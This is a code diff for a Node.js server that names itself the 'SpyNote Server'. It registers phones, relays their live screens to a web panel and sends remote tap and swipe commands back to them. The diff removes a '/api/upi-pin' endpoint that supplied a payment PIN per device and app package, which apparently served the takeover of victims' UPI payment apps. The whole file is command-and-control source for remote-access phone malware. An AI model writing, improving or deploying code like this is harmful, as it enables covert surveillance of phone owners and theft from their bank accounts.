@@ -8,155 +8,115 @@ const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingTimeout: 60000,
-    pingInterval: 25000
+    pingTimeout: 30000,
+    pingInterval: 10000,
+    maxHttpBufferSize: 100 * 1024 * 1024 // 100MB frames
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '50mb' }));
+app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ limit: '100mb', extended: true }));
 
-// =====================
-// DEVICE STORAGE
-// =====================
 const devices = new Map();
+const deviceSockets = new Map(); // socketId -> deviceId mapping
 
-// =====================
-// DEVICE REGISTER API
-// =====================
+// ✅ Device registration API
 app.post('/register', (req, res) => {
-    const { deviceId, model, brand, version, status } = req.body;
-
+    const { deviceId, model, brand, version } = req.body;
     if (deviceId) {
-        devices.set(deviceId, {
-            model,
-            brand,
-            version,
-            status,
-            connected: true
+        devices.set(deviceId, { 
+            model, brand, version, 
+            connected: true, 
+            lastSeen: Date.now(),
+            socketId: null 
         });
-
+        broadcastDevices();
         console.log("✅ Device registered:", deviceId);
-        io.emit('devices-update', Array.from(devices.entries()));
     }
-
     res.json({ success: true });
 });
 
-// =====================
-// GET DEVICES
-// =====================
 app.get('/devices', (req, res) => {
-    res.json(Array.from(devices.entries()));
+    res.json(Array.from(devices.entries()).filter(([_, info]) => 
+        Date.now() - info.lastSeen < 30000 // 30s timeout
+    ));
 });
 
-// =====================
-// ✅ UPI PIN API (ADDED)
-// =====================
-app.get('/api/upi-pin', (req, res) => {
-    const { deviceid, package: packageName, action } = req.query;
-
-    if (!deviceid || !packageName) {
-        return res.status(400).json({
-            action: false,
-            error: 'Missing deviceid or package'
-        });
-    }
-
-    console.log('🔐 UPI PIN Request:', {
-        deviceid,
-        packageName,
-        action
-    });
-
-    if (action === 'true') {
-        // ⚠️ DEMO PIN (Production me DB ya secure vault use karo)
-        return res.json({
-            action: true,
-            pin: "4525"
-        });
-    }
-
-    res.json({ action: false });
-});
-
-// =====================
-// SOCKET.IO
-// =====================
+// 🔥 PERFECT SOCKET.IO HANDLING
 io.on('connection', (socket) => {
-    console.log('🔌 New connection:', socket.id);
+    console.log('🔌 Client connected:', socket.id);
 
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
-
-        if (deviceId) {
-            devices.set(deviceId, {
-                ...deviceInfo,
-                connected: true,
-                socketId: socket.id
+        if (deviceId && devices.has(deviceId)) {
+            devices.set(deviceId, { 
+                ...devices.get(deviceId), 
+                connected: true, 
+                socketId: socket.id,
+                lastSeen: Date.now()
             });
-
+            deviceSockets.set(socket.id, deviceId);
             socket.join(deviceId);
-            console.log("📱 Device joined room:", deviceId);
-            io.emit('devices-update', Array.from(devices.entries()));
+            console.log("📱 Device online:", deviceId, socket.id);
+            broadcastDevices();
         }
     });
 
-    // 📺 Screen frame relay (phone → web)
+    socket.on('select-device', ({ deviceId }) => {
+        console.log('🎯 Web selected:', deviceId);
+    });
+
+    // 🔥 ULTRA FAST SCREEN RELAY
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
-
         if (devices.has(deviceId)) {
+            devices.get(deviceId).lastSeen = Date.now();
             socket.to(deviceId).emit('screen-update', data);
-            console.log('📺 Frame relayed:', deviceId);
         }
     });
 
-    // 🎮 Control relay (web → phone)
+    // 🔥 INSTANT CONTROL RELAY
     socket.on('control', (data) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
-
+        const { deviceId, action, ...params } = data;
         if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('control', {
-                action,
-                x: parseFloat(x) || 0,
-                y: parseFloat(y) || 0,
-                startX: parseFloat(startX) || 0,
-                startY: parseFloat(startY) || 0,
-                endX: parseFloat(endX) || 0,
-                endY: parseFloat(endY) || 0
-            });
-
-            console.log('🎮 Control sent:', action, 'to', deviceId);
+            socket.to(deviceId).emit('control', { action, ...params });
+            console.log('🎮 Control:', action, '→', deviceId);
         }
     });
 
-    // ❌ Disconnect handling
+    socket.on('ping', () => {
+        socket.emit('pong');
+    });
+
     socket.on('disconnect', () => {
-        console.log('🔌 Disconnected:', socket.id);
-
-        for (const [deviceId, info] of devices.entries()) {
-            if (info.socketId === socket.id) {
-                devices.set(deviceId, {
-                    ...info,
-                    connected: false
-                });
-
-                io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device disconnected:', deviceId);
-                break;
-            }
+        const deviceId = deviceSockets.get(socket.id);
+        if (deviceId) {
+            devices.set(deviceId, { 
+                ...devices.get(deviceId), 
+                connected: false, 
+                socketId: null,
+                lastSeen: Date.now()
+            });
+            deviceSockets.delete(socket.id);
+            console.log('📱 Device offline:', deviceId);
+            broadcastDevices();
         }
     });
 });
 
-// =====================
-// SERVER START
-// =====================
-const PORT = process.env.PORT || 3000;
+// Broadcast device list every 2s
+function broadcastDevices() {
+    const activeDevices = Array.from(devices.entries()).filter(([_, info]) => 
+        Date.now() - info.lastSeen < 30000
+    );
+    io.emit('devices-update', activeDevices);
+}
 
+setInterval(broadcastDevices, 2000);
+
+const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 SpyNote Server running on port ${PORT}`);
-    console.log(`🌐 Web panel: http://localhost:${PORT}`);
-    console.log(`📱 Ready for devices!`);
+    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
+    console.log(`📱 Devices ready!`);
 });
